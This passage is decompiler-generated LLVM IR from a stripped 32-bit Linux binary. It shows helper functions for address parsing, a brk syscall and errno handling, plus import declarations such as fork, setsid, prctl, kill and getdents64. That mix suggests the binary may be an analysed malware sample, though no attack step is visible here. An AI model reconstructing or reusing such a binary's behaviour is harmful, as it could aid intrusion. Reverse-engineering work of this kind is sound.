  %v6_80529f4.lcssa.in = phi i16 [ %v5_80529f442, %dec_label_pc_80529db ], [ %v5_80529f4, %dec_label_pc_80529ee ]
  %v8_80529fd = sub nsw i32 2, %v2_8052a17
  %v9_80529fd = and i32 %v8_80529fd, %v2_8052a17
  %v10_80529fd = icmp slt i32 %v9_80529fd, 0
  %v11_80529fd = icmp eq i32 %v2_8052a17, 3
  %v12_80529fd = icmp slt i32 %v2_8052a17, 3
  %v3_8052a01 = icmp eq i1 %v12_80529fd, %v10_80529fd
  %v4_8052a01 = icmp eq i1 %v11_80529fd, false
  %v5_8052a01 = and i1 %v4_8052a01, %v3_8052a01
  br i1 %v5_8052a01, label %dec_label_pc_8052a0b, label %dec_label_pc_8052a03

dec_label_pc_8052a03:                             ; preds = %dec_label_pc_80529fd
  %v10_8052a03 = icmp eq i8 %v2_80529ef.lcssa, 46
  %v1_8052a06 = icmp eq i1 %v10_8052a03, false
  br i1 %v1_8052a06, label %dec_label_pc_8052a3d, label %dec_label_pc_8052a08

dec_label_pc_8052a08:                             ; preds = %dec_label_pc_8052a03
  br label %dec_label_pc_8052a14

dec_label_pc_8052a0b:                             ; preds = %dec_label_pc_80529fd
  %v4_8052a0c = icmp ne i8 %v2_80529ef.lcssa, 0
  %v2_8052a10 = and i16 %v6_80529f4.lcssa.in, 32
  %v3_8052a10 = icmp eq i16 %v2_8052a10, 0
  %or.cond = and i1 %v4_8052a0c, %v3_8052a10
  br i1 %or.cond, label %dec_label_pc_8052a3d, label %dec_label_pc_8052a14

dec_label_pc_8052a14:                             ; preds = %dec_label_pc_8052a0b, %dec_label_pc_8052a08
  %v0_80529cb3 = add i32 %v0_80529ee.lcssa, 1
  %v2_8052a14 = mul i32 %v0_8052a14, 256
  %v3_8052a17 = add nuw nsw i32 %v2_8052a17, 1
  %v2_8052a1a = or i32 %v1_80529df.lcssa, %v2_8052a14
  %v7_8052a20 = icmp sgt i32 %v2_8052a17, 3
  br i1 %v7_8052a20, label %dec_label_pc_8052a22, label %dec_label_pc_80529cb

dec_label_pc_8052a22:                             ; preds = %dec_label_pc_8052a14
  %v4_8052a27 = icmp eq i32 %arg2, 0
  br i1 %v4_8052a27, label %dec_label_pc_8052a3f, label %dec_label_pc_8052a2e

dec_label_pc_8052a2e:                             ; preds = %dec_label_pc_8052a22
  %v1_8052a32 = call i32 @llvm.bswap.i32(i32 %v2_8052a1a)
  %v2_8052a34 = inttoptr i32 %arg2 to i32*
  store i32 %v1_8052a32, i32* %v2_8052a34, align 4
  br label %dec_label_pc_8052a3f

dec_label_pc_8052a3d:                             ; preds = %dec_label_pc_8052a0b, %dec_label_pc_8052a03, %dec_label_pc_80529cb, %dec_label_pc_80529df, %dec_label_pc_80529b1
  br label %dec_label_pc_8052a3f

dec_label_pc_8052a3f:                             ; preds = %dec_label_pc_8052a22, %dec_label_pc_8052a2e, %dec_label_pc_8052a3d
  %v0_8052a44 = phi i32 [ 1, %dec_label_pc_8052a22 ], [ 1, %dec_label_pc_8052a2e ], [ 0, %dec_label_pc_8052a3d ]
  ret i32 %v0_8052a44

; uselistorder directives
  uselistorder i32 %v2_80529f1, { 1, 0 }
  uselistorder i32 %v6_80529ef, { 1, 0 }
  uselistorder i32 %v1_80529ee, { 0, 2, 1 }
  uselistorder i32 %v1_80529e6, { 1, 0 }
  uselistorder i32 %v3_80529e2, { 0, 2, 4, 3, 1 }
  uselistorder i32 %v2_8052a17, { 1, 4, 2, 0, 3, 5 }
  uselistorder i32 %v0_80529ce.pre, { 1, 0, 2 }
  uselistorder i32 256, { 1, 18, 20, 19, 2, 0, 3, 4, 5, 21, 16, 6, 7, 9, 8, 17, 10, 11, 12, 13, 14, 15 }
  uselistorder i8 46, { 1, 0 }
  uselistorder i32 3, { 1, 2, 0, 12, 10, 13, 6, 7, 9, 3, 16, 17, 18, 19, 20, 21, 22, 11, 4, 8, 14, 15, 5 }
  uselistorder i32 10, { 0, 6, 5, 3, 8, 1, 7, 10, 11, 12, 4, 13, 2, 9 }
  uselistorder i16 0, { 0, 2, 1, 6, 7, 8, 9, 5, 3, 4 }
  uselistorder i16 8, { 1, 0 }
  uselistorder i32 -256, { 10, 0, 4, 5, 40, 11, 12, 3, 30, 28, 36, 32, 6, 7, 8, 9, 23, 24, 25, 26, 27, 29, 31, 33, 34, 35, 37, 38, 39, 13, 14, 15, 16, 17, 18, 19, 20, 1, 2, 21, 22, 41 }
  uselistorder i8 0, { 15, 16, 47, 46, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 7, 27, 14, 40, 1, 28, 29, 30, 41, 42, 43, 38, 39, 37, 44, 0, 45, 2, 32, 34, 31, 5, 33, 6, 35, 36, 3, 4, 13, 8, 9, 10, 11, 12 }
  uselistorder i32 2, { 35, 38, 11, 39, 1, 66, 13, 67, 14, 33, 0, 20, 30, 21, 31, 22, 32, 2, 3, 4, 40, 5, 6, 7, 15, 16, 41, 8, 9, 18, 10, 23, 17, 19, 26, 24, 25, 42, 43, 44, 45, 51, 52, 57, 54, 56, 55, 58, 59, 60, 36, 37, 53, 61, 62, 34, 63, 28, 27, 46, 47, 48, 49, 50, 29, 12, 64, 65 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_8052a3f, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8052a3d, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_80529df, { 1, 0 }
  uselistorder label %dec_label_pc_80529cb, { 1, 0 }
}

define i32 @function_8052a45(i32 %arg1) local_unnamed_addr {
dec_label_pc_8052a45:
  %v0_8052a48 = call i32 @function_8050287()
  %v0_8052a4d = load i32, i32* @edx, align 4
  %v4_8052a54 = call i32 @function_8050312(i32 %v0_8052a48, i32 %arg1, i32 %v0_8052a4d, i32 %v0_8052a4d)
  ret i32 %v4_8052a54

; uselistorder directives
  uselistorder i32* @edx, { 126, 21, 0, 2, 22, 23, 24, 1, 13, 14, 16, 12, 120, 25, 128, 129, 133, 132, 28, 29, 3, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 4, 43, 44, 26, 27, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 5, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 6, 101, 102, 103, 104, 105, 106, 107, 131, 15, 17, 18, 130, 125, 127, 108, 19, 20, 117, 118, 119, 116, 10, 9, 8, 7, 121, 11, 122, 124, 123, 109, 110, 111, 112, 113, 114, 115, 134 }
}

define i32 @function_8052a5d() local_unnamed_addr {
dec_label_pc_8052a5d:
  %v0_8052a5d = load i32, i32* @eax, align 4
  %v1_8052a5d = add i32 %v0_8052a5d, 28
  %v2_8052a5d = inttoptr i32 %v1_8052a5d to i32*
  %v3_8052a5d = load i32, i32* %v2_8052a5d, align 4
  store i32 %v3_8052a5d, i32* @global_var_8054938.73, align 8
  %v1_8052a66 = add i32 %v0_8052a5d, 44
  %v2_8052a66 = inttoptr i32 %v1_8052a66 to i32*
  %v3_8052a66 = load i32, i32* %v2_8052a66, align 4
  store i32 %v3_8052a66, i32* @global_var_805493c.74, align 4
  ret i32 %v3_8052a66

; uselistorder directives
  uselistorder i32 44, { 10, 3, 2, 7, 9, 8, 4, 5, 6, 0, 1 }
  uselistorder i32 28, { 21, 10, 11, 9, 12, 13, 14, 6, 7, 8, 4, 1, 5, 3, 2, 15, 16, 17, 18, 19, 20, 0 }
}

define i32 @function_8052a6f(i32 %arg1) local_unnamed_addr {
dec_label_pc_8052a6f:
  %ecx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8052a6f = load i32, i32* @ebx, align 4
  store i32 %v0_8052a6f, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ecx.global-to-local, align 4
  %v1_8052a82 = call i32 @int80_syscall(i32 45)
  store i32 0, i32* %ecx.global-to-local, align 4
  store i32 %v1_8052a82, i32* @global_var_80543f8.71, align 8
  %v7_8052a8d = icmp ult i32 %v1_8052a82, %arg1
  %v1_8052a8f = icmp eq i1 %v7_8052a8d, false
  br i1 %v1_8052a8f, label %dec_label_pc_8052a9f, label %dec_label_pc_8052a91

dec_label_pc_8052a91:                             ; preds = %dec_label_pc_8052a6f
  %v1_8052a91 = call i32 @function_805076b(i32 %v0_8052a6f)
  store i32 -1, i32* %ecx.global-to-local, align 4
  %v1_8052a99 = inttoptr i32 %v1_8052a91 to i32*
  store i32 12, i32* %v1_8052a99, align 4
  %v0_8052a9f.pre = load i32, i32* %ecx.global-to-local, align 4
  %v2_8052aa3.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8052a9f

dec_label_pc_8052a9f:                             ; preds = %dec_label_pc_8052a6f, %dec_label_pc_8052a91
  %v2_8052aa3 = phi i32 [ %v0_8052a6f, %dec_label_pc_8052a6f ], [ %v2_8052aa3.pre, %dec_label_pc_8052a91 ]
  %v0_8052a9f = phi i32 [ 0, %dec_label_pc_8052a6f ], [ %v0_8052a9f.pre, %dec_label_pc_8052a91 ]
  store i32 %v2_8052aa3, i32* @ebx, align 4
  ret i32 %v0_8052a9f

; uselistorder directives
  uselistorder i32 %v1_8052a82, { 1, 0 }
  uselistorder i32 12, { 24, 17, 18, 12, 13, 14, 11, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 64, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 9, 63, 10, 15, 16, 19, 20, 21, 65, 66, 76, 77, 87, 67, 73, 74, 1, 70, 72, 2, 71, 78, 22, 23, 68, 69, 75, 79, 80, 8, 81, 82, 84, 85, 3, 83, 4, 5, 6, 7, 86, 0 }
  uselistorder i32* @global_var_80543f8.71, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8052a9f, { 1, 0 }
}

define i32 @function_8052aa5() local_unnamed_addr {
dec_label_pc_8052aa5:
  %v0_8052aa8 = load i32, i32* @eax, align 4
  %v1_8052aaa = sub i32 0, %v0_8052aa8
  %v1_8052aac = call i32 @function_805076b(i32 ptrtoint (i32* @0 to i32))
  %v2_8052ab1 = inttoptr i32 %v1_8052aac to i32*
  store i32 %v1_8052aaa, i32* %v2_8052ab1, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 (i32)* @function_805076b, { 30, 29, 47, 13, 28, 27, 46, 12, 50, 11, 5, 10, 45, 44, 43, 51, 9, 21, 6, 26, 8, 7, 25, 22, 24, 23, 49, 48, 42, 41, 40, 39, 38, 20, 4, 3, 37, 19, 36, 35, 34, 2, 15, 33, 32, 14, 17, 18, 1, 0, 31, 16 }
  uselistorder i32 ptrtoint (i32* @0 to i32), { 0, 1, 2, 3, 4, 5, 6, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 7, 22, 8, 9, 10, 23, 24, 25, 26, 27, 28, 11, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39 }
}

define i32 @function_8052ac0() local_unnamed_addr {
dec_label_pc_8052ac0:
  %stack_var_-16 = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp6, i32* %stack_var_-16, align 4
  %v0_8052acc = load i32, i32* @global_var_80542a4.58, align 4
  %v10_8052ad1 = icmp eq i32 %v0_8052acc, -1
  br i1 %v10_8052ad1, label %dec_label_pc_8052ae2, label %dec_label_pc_8052ad6.preheader

dec_label_pc_8052ad6.preheader:                   ; preds = %dec_label_pc_8052ac0
  br label %dec_label_pc_8052ad6

dec_label_pc_8052ad6:                             ; preds = %dec_label_pc_8052ad6.preheader, %dec_label_pc_8052ad6
  %v4_8052ad9 = phi i32 [ %v0_8052acc, %dec_label_pc_8052ad6.preheader ], [ %v2_8052adb, %dec_label_pc_8052ad6 ]
  %v0_8052ad6 = phi i32 [ ptrtoint (i32* @global_var_80542a4.58 to i32), %dec_label_pc_8052ad6.preheader ], [ %v1_8052ad6, %dec_label_pc_8052ad6 ]
  %v1_8052ad6 = add i32 %v0_8052ad6, -4
  call void @__pseudo_call(i32 %v4_8052ad9)
  %v1_8052adb = inttoptr i32 %v1_8052ad6 to i32*
  %v2_8052adb = load i32, i32* %v1_8052adb, align 4
  %v10_8052add = icmp eq i32 %v2_8052adb, -1
  %v1_8052ae0 = icmp eq i1 %v10_8052add, false
  br i1 %v1_8052ae0, label %dec_label_pc_8052ad6, label %dec_label_pc_8052ae2.loopexit

dec_label_pc_8052ae2.loopexit:                    ; preds = %dec_label_pc_8052ad6
  %v2_8052ae2.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_8052ae2

dec_label_pc_8052ae2:                             ; preds = %dec_label_pc_8052ae2.loopexit, %dec_label_pc_8052ac0
  %v2_8052ae2 = phi i32 [ %v2_8052ae2.pre, %dec_label_pc_8052ae2.loopexit ], [ %tmp6, %dec_label_pc_8052ac0 ]
  ret i32 %v2_8052ae2

; uselistorder directives
  uselistorder i32 %v0_8052acc, { 1, 0 }
  uselistorder i1 false, { 138, 35, 36, 37, 39, 38, 0, 40, 41, 42, 30, 31, 155, 156, 157, 158, 160, 14, 161, 162, 159, 154, 139, 26, 140, 141, 142, 2, 144, 145, 1, 146, 147, 148, 149, 4, 150, 151, 152, 153, 3, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 43, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 7, 69, 70, 13, 72, 71, 75, 73, 74, 8, 15, 76, 77, 143, 27, 5, 28, 29, 106, 107, 17, 32, 33, 34, 95, 96, 108, 6, 78, 79, 80, 102, 19, 97, 98, 20, 99, 100, 21, 92, 93, 103, 109, 104, 9, 10, 89, 11, 90, 91, 94, 101, 105, 110, 111, 112, 113, 23, 137, 114, 22, 115, 116, 117, 118, 119, 120, 121, 122, 12, 123, 124, 125, 126, 127, 128, 129, 130, 136, 131, 134, 81, 82, 83, 84, 85, 86, 87, 24, 88, 18, 132, 133, 135, 163, 25, 16, 164 }
  uselistorder void (i32)* @__pseudo_call, { 1, 3, 4, 5, 6, 2, 0 }
  uselistorder i32 -4, { 8, 9, 10, 11, 44, 45, 46, 47, 4, 48, 1, 43, 12, 49, 5, 50, 51, 52, 6, 0, 2, 3, 53, 54, 55, 56, 57, 58, 59, 7, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42 }
  uselistorder i32 ptrtoint (i32* @global_var_80542a4.58 to i32), { 1, 3, 4, 0, 5, 6, 2 }
  uselistorder i32 -1, { 25, 26, 0, 91, 176, 54, 92, 18, 55, 93, 56, 94, 57, 95, 58, 96, 59, 97, 60, 98, 61, 99, 62, 100, 63, 101, 19, 20, 7, 6, 64, 65, 102, 66, 103, 67, 104, 27, 1, 105, 53, 68, 69, 106, 107, 108, 9, 109, 8, 110, 177, 11, 12, 111, 10, 112, 28, 162, 29, 113, 163, 31, 32, 21, 16, 33, 70, 34, 114, 30, 164, 4, 115, 116, 22, 23, 24, 117, 13, 15, 35, 2, 71, 159, 160, 170, 171, 72, 161, 36, 73, 118, 74, 119, 75, 120, 51, 52, 121, 76, 122, 77, 123, 78, 124, 79, 125, 80, 126, 81, 127, 82, 128, 83, 129, 84, 130, 85, 131, 86, 132, 87, 133, 88, 134, 89, 135, 37, 169, 5, 14, 50, 172, 165, 41, 136, 166, 39, 47, 137, 48, 138, 40, 49, 139, 173, 38, 140, 141, 142, 143, 167, 168, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 42, 174, 155, 175, 3, 17, 43, 156, 44, 45, 46, 157, 158, 90 }
  uselistorder i32 1, { 183, 184, 47, 114, 115, 297, 0, 298, 116, 401, 185, 17, 16, 18, 186, 9, 8, 7, 187, 3, 188, 189, 24, 191, 190, 10, 193, 192, 11, 194, 43, 195, 64, 196, 35, 197, 59, 198, 62, 199, 61, 200, 201, 29, 28, 30, 133, 32, 203, 202, 205, 204, 40, 206, 25, 208, 207, 41, 209, 213, 212, 211, 210, 14, 402, 403, 404, 216, 215, 214, 99, 100, 98, 117, 217, 219, 218, 60, 118, 176, 290, 111, 225, 224, 223, 222, 221, 220, 57, 56, 134, 226, 177, 229, 228, 227, 55, 135, 300, 301, 302, 230, 46, 303, 304, 119, 305, 306, 307, 22, 20, 21, 109, 299, 136, 71, 72, 73, 74, 137, 120, 308, 309, 310, 311, 233, 232, 231, 95, 94, 96, 138, 234, 12, 13, 140, 312, 313, 314, 315, 316, 317, 318, 319, 320, 139, 321, 322, 323, 324, 325, 121, 326, 327, 101, 122, 328, 329, 330, 331, 123, 124, 332, 333, 334, 237, 236, 235, 52, 49, 50, 53, 51, 125, 126, 238, 127, 128, 242, 241, 240, 239, 48, 141, 178, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 291, 292, 255, 6, 5, 4, 256, 257, 142, 143, 258, 259, 129, 261, 260, 39, 144, 262, 263, 23, 264, 15, 265, 63, 266, 31, 267, 38, 268, 81, 269, 26, 270, 27, 271, 34, 19, 273, 272, 45, 274, 54, 275, 75, 277, 276, 58, 278, 88, 279, 44, 280, 42, 33, 282, 281, 97, 376, 130, 377, 378, 110, 384, 104, 36, 37, 335, 379, 181, 89, 91, 90, 93, 92, 380, 182, 65, 67, 66, 69, 68, 82, 336, 337, 338, 339, 364, 365, 160, 161, 146, 381, 382, 156, 370, 371, 148, 374, 375, 150, 372, 373, 385, 158, 293, 294, 159, 154, 295, 296, 155, 366, 367, 152, 368, 369, 153, 157, 151, 149, 147, 145, 383, 386, 162, 387, 163, 388, 390, 400, 389, 391, 392, 393, 394, 395, 396, 398, 164, 399, 83, 85, 86, 84, 87, 397, 179, 283, 70, 340, 341, 342, 343, 171, 170, 108, 102, 344, 345, 131, 106, 107, 103, 346, 347, 132, 105, 172, 348, 349, 350, 351, 180, 352, 353, 354, 355, 167, 168, 356, 357, 169, 174, 173, 358, 359, 165, 360, 361, 362, 166, 363, 286, 285, 284, 77, 78, 79, 76, 80, 287, 1, 175, 2, 112, 113, 405, 289, 288 }
  uselistorder label %dec_label_pc_8052ad6, { 1, 0 }
}

define i32 @function_8052ae6() local_unnamed_addr {
entry:
  %v0_8052ae9 = load i32, i32* @ebx, align 4
  %v1_8052aea = call i32 @function_80480b0(i32 %v0_8052ae9)
  store i32 %v1_8052aea, i32* @eax, align 4
  %v0_8052af5 = call i32 @function_80480c0()
  ret i32 %v0_8052af5

; uselistorder directives
  uselistorder i32* @eax, { 7, 14, 40, 42, 43, 44, 45, 47, 11, 48, 0, 46, 4, 6, 41, 15, 17, 18, 16, 19, 20, 21, 27, 22, 23, 25, 26, 24, 1, 12, 13, 8, 2, 9, 10, 30, 29, 31, 35, 36, 37, 32, 33, 34, 28, 49, 38, 39, 3, 5 }
  uselistorder i32 (i32)* @function_80480b0, { 1, 0 }
  uselistorder i32 0, { 256, 43, 172, 44, 257, 258, 5, 259, 260, 261, 6, 45, 80, 81, 231, 232, 46, 224, 262, 263, 264, 96, 265, 410, 266, 267, 225, 226, 411, 215, 214, 412, 413, 414, 216, 227, 228, 233, 234, 212, 415, 351, 27, 28, 416, 82, 434, 435, 7, 47, 173, 8, 174, 175, 445, 446, 76, 447, 48, 158, 49, 97, 98, 0, 417, 418, 419, 50, 213, 167, 51, 176, 420, 1, 83, 84, 52, 421, 422, 53, 54, 424, 423, 14, 15, 425, 428, 99, 159, 429, 431, 430, 12, 13, 432, 433, 55, 436, 18, 160, 56, 85, 438, 441, 440, 16, 17, 270, 271, 272, 273, 274, 86, 275, 276, 277, 29, 30, 31, 32, 268, 100, 269, 101, 177, 278, 40, 279, 87, 178, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290, 88, 89, 291, 179, 303, 180, 181, 102, 161, 182, 103, 162, 57, 183, 292, 293, 58, 59, 104, 163, 42, 294, 295, 296, 60, 61, 105, 164, 41, 297, 77, 298, 38, 299, 300, 302, 184, 301, 2, 439, 426, 427, 217, 218, 220, 219, 19, 20, 3, 90, 221, 222, 223, 304, 229, 230, 185, 186, 235, 236, 237, 238, 239, 240, 241, 242, 187, 243, 244, 352, 437, 245, 353, 246, 247, 248, 442, 91, 408, 249, 250, 409, 305, 354, 443, 444, 62, 63, 251, 65, 64, 66, 188, 355, 39, 9, 67, 189, 68, 190, 339, 191, 192, 306, 307, 310, 193, 311, 92, 326, 327, 356, 357, 358, 33, 194, 405, 348, 349, 328, 195, 340, 333, 196, 337, 335, 342, 359, 360, 252, 253, 254, 255, 343, 344, 345, 329, 330, 331, 332, 334, 336, 338, 341, 346, 347, 21, 22, 350, 69, 197, 361, 70, 198, 362, 363, 365, 71, 402, 403, 404, 78, 364, 199, 366, 367, 368, 369, 370, 371, 372, 373, 379, 168, 374, 375, 376, 377, 378, 380, 200, 201, 72, 202, 382, 383, 384, 385, 386, 93, 34, 387, 388, 389, 203, 325, 397, 398, 399, 400, 390, 391, 392, 396, 401, 35, 94, 381, 73, 165, 204, 205, 169, 170, 312, 313, 26, 24, 206, 25, 23, 207, 208, 314, 315, 316, 317, 318, 319, 320, 95, 209, 321, 322, 323, 324, 166, 210, 308, 309, 36, 393, 394, 395, 10, 37, 171, 11, 74, 4, 406, 407, 75, 211, 79, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 448, 449, 450, 451, 452, 453, 454, 455 }
  uselistorder i32* @ebx, { 13, 77, 78, 44, 45, 18, 79, 0, 80, 81, 237, 82, 83, 84, 238, 15, 239, 240, 241, 242, 243, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 46, 1, 47, 48, 49, 14, 244, 245, 198, 199, 85, 86, 246, 247, 248, 11, 12, 274, 275, 276, 277, 9, 2, 8, 259, 268, 272, 273, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 264, 265, 87, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 3, 102, 103, 88, 89, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 4, 116, 117, 118, 119, 120, 121, 122, 123, 149, 150, 151, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 10, 134, 135, 136, 137, 138, 5, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 262, 263, 16, 17, 37, 38, 39, 40, 41, 42, 43, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 200, 201, 260, 261, 68, 202, 203, 69, 70, 71, 266, 267, 233, 234, 72, 73, 235, 236, 152, 153, 204, 205, 269, 270, 271, 74, 158, 159, 206, 188, 181, 185, 186, 187, 183, 184, 189, 190, 75, 76, 191, 182, 192, 193, 194, 195, 196, 197, 207, 208, 209, 210, 211, 7, 212, 213, 215, 214, 225, 226, 227, 6, 228, 216, 217, 218, 219, 220, 221, 222, 223, 224, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 154, 155, 156, 157, 229, 230, 231, 232 }
}

; Function Attrs: nounwind readnone
declare i32 @llvm.ctlz.i32(i32, i1) #1

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #1

declare i8* @_memset(i8*, i32, i32) local_unnamed_addr

declare i8* @_memcpy(i8*, i8*, i32) local_unnamed_addr

; Function Attrs: nounwind readnone
declare i16 @llvm.bswap.i16(i16) #1

declare i32 @unknown_0(i32) local_unnamed_addr

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr

declare i32 @int80_syscall(i32) local_unnamed_addr

declare i32 @close(i32) local_unnamed_addr

declare i32 @fork(i32) local_unnamed_addr

declare i32 @getpid(i32) local_unnamed_addr

declare i32 @getppid(i32) local_unnamed_addr

declare i32 @ioctl(i32, i32, ...) local_unnamed_addr

declare i32 @kill(i32, i32) local_unnamed_addr

declare i32 @open(i8*, i32, ...) local_unnamed_addr

declare i32 @prctl(i32, i32, i32, i32, i32) local_unnamed_addr

declare i32 @read(i32, i32*, i32) local_unnamed_addr

declare i32 @readlink(i8*, i8*, i32) local_unnamed_addr

declare i32 @setsid(i32) local_unnamed_addr

declare i32 @sigprocmask(i32, %_TYPEDEF_sigset_t*, %_TYPEDEF_sigset_t*) local_unnamed_addr

declare i32 @time(i32*) local_unnamed_addr

declare i32 @unlink(i8*) local_unnamed_addr

declare i32 @write(i32, i32*, i32) local_unnamed_addr

declare i32 @sigreturn(%sigcontext*) local_unnamed_addr

declare i32* @mmap(i32*, i32, i32, i32, i32, i32) local_unnamed_addr

declare i32 @sigaction(i32, %sigaction*, %sigaction*) local_unnamed_addr

declare void @exit(i32) local_unnamed_addr

declare i32 @clock_getres(i32, %timespec*) local_unnamed_addr

declare i32 @fstat(i32, %stat*) local_unnamed_addr

declare i32 @getdents64(i32, %linux_dirent64*, i32) local_unnamed_addr

declare i32* @mremap(i32*, i32, i32, i32, ...) local_unnamed_addr

declare i32 @munmap(i32*, i32) local_unnamed_addr

declare i32 @nanosleep(%timespec*, %timespec*) local_unnamed_addr

declare i32 @times(%tms*) local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i8 @__decompiler_undefined_function_1() local_unnamed_addr

declare i16* @__decompiler_undefined_function_2() local_unnamed_addr

declare i16 @__decompiler_undefined_function_3() local_unnamed_addr

declare i64 @__decompiler_undefined_function_4() local_unnamed_addr

declare i8* @__decompiler_undefined_function_5() local_unnamed_addr

declare %_TYPEDEF_sigset_t* @__decompiler_undefined_function_6() local_unnamed_addr

declare %sigaction* @__decompiler_undefined_function_7() local_unnamed_addr

declare %timespec* @__decompiler_undefined_function_8() local_unnamed_addr

declare %tms* @__decompiler_undefined_function_9() local_unnamed_addr

attributes #0 = { noreturn }
attributes #1 = { nounwind readnone }
